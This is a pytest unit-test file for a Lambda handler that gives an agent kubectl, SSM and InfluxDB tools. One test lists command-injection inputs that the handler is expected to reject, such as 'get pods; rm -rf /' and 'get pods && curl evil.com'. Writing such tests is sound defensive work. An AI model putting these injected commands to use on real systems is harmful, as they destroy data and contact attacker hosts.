# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
# SPDX-License-Identifier: MIT-0
"""Unit tests for the AgentCore Gateway Lambda handler."""

import json
import sys
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import MagicMock, patch

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "lambda_tools"))


def make_context(tool_name: str = "anra-tools___kubectl_command"):
    """Build a fake Lambda context with the AgentCore custom fields."""
    ctx = SimpleNamespace()
    ctx.client_context = SimpleNamespace()
    ctx.client_context.custom = {
        "bedrockAgentCoreToolName": tool_name,
        "bedrockAgentCoreMessageVersion": "1.0",
        "bedrockAgentCoreAwsRequestId": "test-req-id",
        "bedrockAgentCoreMcpMessageId": "test-mcp-id",
        "bedrockAgentCoreGatewayId": "test-gw-id",
        "bedrockAgentCoreTargetId": "test-target-id",
    }
    return ctx


def test_extract_tool_name_strips_prefix():
    import handler

    ctx = make_context("anra-tools___kubectl_command")
    assert handler._extract_tool_name(ctx) == "kubectl_command"


def test_extract_tool_name_no_prefix():
    import handler

    ctx = make_context("kubectl_command")
    assert handler._extract_tool_name(ctx) == "kubectl_command"


def test_extract_tool_name_missing_field_returns_empty():
    import handler

    ctx = SimpleNamespace()
    ctx.client_context = SimpleNamespace(custom={})
    assert handler._extract_tool_name(ctx) == ""


def test_unknown_tool_returns_error():
    import handler

    ctx = make_context("anra-tools___nonexistent")
    response = handler.lambda_handler({}, ctx)
    assert response["statusCode"] == 400
    body = json.loads(response["body"])
    assert "Unknown tool" in body["error"]


def test_kubectl_missing_command_arg():
    import handler

    ctx = make_context("anra-tools___kubectl_command")
    response = handler.lambda_handler({}, ctx)
    assert response["statusCode"] == 400


def test_kubectl_rejects_shell_metacharacters():
    import handler

    ctx = make_context("anra-tools___kubectl_command")
    bad_inputs = [
        {"command": "get pods; rm -rf /"},
        {"command": "get pods | tee /tmp/file"},
        {"command": "get pods && curl evil.com"},
        {"command": "get pods `whoami`"},
        {"command": "get pods $(echo)"},
    ]
    for payload in bad_inputs:
        response = handler.lambda_handler(payload, ctx)
        assert response["statusCode"] == 400, f"Expected reject for: {payload}"
        body = json.loads(response["body"])
        assert "metacharacters" in body["error"]


def test_kubectl_executes_command(monkeypatch):
    import handler

    monkeypatch.setenv("EKS_CLUSTER_NAME", "test-cluster")

    # Skip the kubeconfig setup
    monkeypatch.setattr(handler, "_ensure_kubeconfig", lambda: None)

    fake = MagicMock()
    fake.stdout = "NAME      STATUS    AGE\npod-1     Running   1h"
    fake.stderr = ""
    fake.returncode = 0
    monkeypatch.setattr("subprocess.run", lambda *a, **kw: fake)

    ctx = make_context("anra-tools___kubectl_command")
    response = handler.lambda_handler({"command": "get pods"}, ctx)

    assert response["statusCode"] == 200
    body = json.loads(response["body"])
    assert body["result"]["exit_code"] == 0
    assert "pod-1" in body["result"]["stdout"]


def test_ssm_missing_args():
    import handler

    ctx = make_context("anra-tools___ssm_command")
    response = handler.lambda_handler({"instance_id": "i-123"}, ctx)
    assert response["statusCode"] == 400


def test_ssm_command_success(monkeypatch):
    import handler

    fake_ssm = MagicMock()
    fake_ssm.send_command.return_value = {"Command": {"CommandId": "cmd-1"}}
    fake_ssm.get_command_invocation.return_value = {
        "Status": "Success",
        "StandardOutputContent": "active",
        "StandardErrorContent": "",
        "ResponseCode": 0,
    }
    monkeypatch.setattr("boto3.client", lambda *a, **kw: fake_ssm)
    monkeypatch.setattr("time.sleep", lambda _: None)

    ctx = make_context("anra-tools___ssm_command")
    response = handler.lambda_handler(
        {"instance_id": "i-abc123", "command": "systemctl status amf"}, ctx
    )

    assert response["statusCode"] == 200
    body = json.loads(response["body"])
    assert body["result"]["status"] == "Success"
    assert body["result"]["stdout"] == "active"


def test_influxdb_query_missing_url(monkeypatch):
    import handler

    monkeypatch.setattr(handler, "INFLUXDB_URL", "")

    ctx = make_context("anra-tools___influxdb_query")
    response = handler.lambda_handler({"flux": 'from(bucket:"metrics")'}, ctx)
    assert response["statusCode"] == 500


def test_influxdb_query_missing_flux_arg():
    import handler

    ctx = make_context("anra-tools___influxdb_query")
    response = handler.lambda_handler({}, ctx)
    assert response["statusCode"] == 400


@pytest.mark.parametrize(
    "tool_name",
    ["kubectl_command", "ssm_command", "influxdb_query"],
)
def test_dispatch_table_complete(tool_name):
    import handler

    assert tool_name in handler._DISPATCH
